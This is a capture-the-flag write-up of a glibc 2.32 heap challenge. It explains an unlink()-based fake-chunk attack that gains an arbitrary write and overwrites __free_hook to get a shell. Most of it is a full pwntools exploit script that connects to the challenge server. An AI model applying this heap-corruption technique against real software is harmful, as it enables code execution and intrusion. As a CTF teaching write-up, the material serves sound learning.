# the good old time

###### This was a heap challenge with multiple bugs, however I used th unlink() exploit.
#
Lets look at the challenge binary:
```
[*] '/pwd/heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enable
```

As you can see, there is **full** protection. Also the latest libc is used (**2.32**). So this is a classical note-taking program, with options create, edit, show and delete. It has no index, no double free and no lengh protection. With that given I
wanted my exploit to be a bit more special. I used the *new* unlink exploit **(the name of the challenge is related
to the old time, where dlmalloc unlink() exploit was a thing)**. The principle is easy. First we get a leak by doing show(0), because the main address was stored in the heap chunk at index 0. Then we allocated two chunks with size 0x420, edited the first one and filled in `p64(0x0) + p64(0x421) + p64(ptr_chunk1-0x18)`
`+ p64(ptr_chunk1-0x10) + "\x00"*0x400 + p64(0x420) + p64(0x430)`. 
So we created a fake chunk with the fd and bk pointing into bss, where the ptr array is, to pass the check:
`(P->fd->bk != P || P->bk->fd != P) == False`
Now we have to free the second chunk. Then edit the first chunk to: `"\x00"*24 + p64(addr_to_write)`.
Edit the first chunk again to your value and then we have an arb write! Now that you know how I got arb write, my
exploit should be understandable. We had to leak libc, overwrite **__free_hook** and free a chunk which has
`/bin/sh` in it. Here it is:
```python
from pwn import *

def create(idx, sz, data):
  p.sendline("1")
  p.sendline(str(idx))
  p.sendline(str(sz))
  p.sendline(data)

def edit(idx, data):
  p.sendline("2")
  p.sendline(str(idx))
  p.sendline(data)

def show(idx):
  p.sendline("3")
  p.sendline(str(idx))

def delete(idx):
  p.sendline("4")
  p.sendline(str(idx))

def exit():
  p.sendline("5")

#p = process("./heap",env={"LD_PRELOAD" : "./libc.so.6"})
p = remote("35.246.22.179", 49155)

show(0)

p.recvuntil("index: ")
leak = p.recvline()
pie_leak = u64(leak[:6].ljust(8, "\x00"))
pie_base = pie_leak - 0x12a9
puts_got = pie_base + 0x3f88
bss = pie_base + 0x4300
chunks_arr = pie_base + 0x4060

create(1,0x420,"BBBBBBBB")
create(2,0x420,"\x00")
edit(1,p64(0x0)+p64(0x421)+p64(chunks_arr+0x8-0x18)+p64(chunks_arr+0x8-0x10)+"\x00"*0x400+p64(0x420)+p64(0x430))
delete(2)

edit(1,"\x00"*24 + p64(chunks_arr+0x8))
edit(1, p64(puts_got))

show(1)

p.recvuntil("index: ")
p.recvuntil("index: ")
p.recvuntil("index: ")
p.recvuntil("index: ")
p.recvuntil("index: ")
p.recvuntil("index: ")
p.recvuntil("index: ")
leak = p.recv().split("\n")
libc_leak = u64(leak[0].ljust(8, "\x00"))
libc_base = libc_leak - 0x80d90
sh = libc_base + 0x1ae41f
system = libc_base + 0x503c0
free_hook = libc_base + 0x1e6e40

create(3,0x420,"BBBBBBBB")
create(4,0x420,"\x00")
edit(3,p64(0x0)+p64(0x421)+p64(chunks_arr+0x18-0x18)+p64(chunks_arr+0x18-0x10)+"\x00"*0x400+p64(0x420)+p64(0x430))
delete(4)

edit(3,"\x00"*24 + p64(bss))
edit(3, "/bin/sh\x00")

create(5,0x420,"BBBBBBBB")
create(6,0x420,"\x00")
edit(5,p64(0x0)+p64(0x421)+p64(chunks_arr+0x28-0x18)+p64(chunks_arr+0x28-0x10)+"\x00"*0x400+p64(0x420)+p64(0x430))
delete(6)

edit(5,"\x00"*24 + p64(chunks_arr+0x8))
edit(5, p64(bss))

create(7,0x420,"BBBBBBBB")
create(8,0x420,"\x00")
edit(7,p64(0x0)+p64(0x421)+p64(chunks_arr+0x38-0x18)+p64(chunks_arr+0x38-0x10)+"\x00"*0x400+p64(0x420)+p64(0x430))
delete(8)

edit(7,"\x00"*24 + p64(free_hook))
edit(7, p64(system))

delete(1)

p.interactive()

```
###### Cool we get a shell! Fun challenge!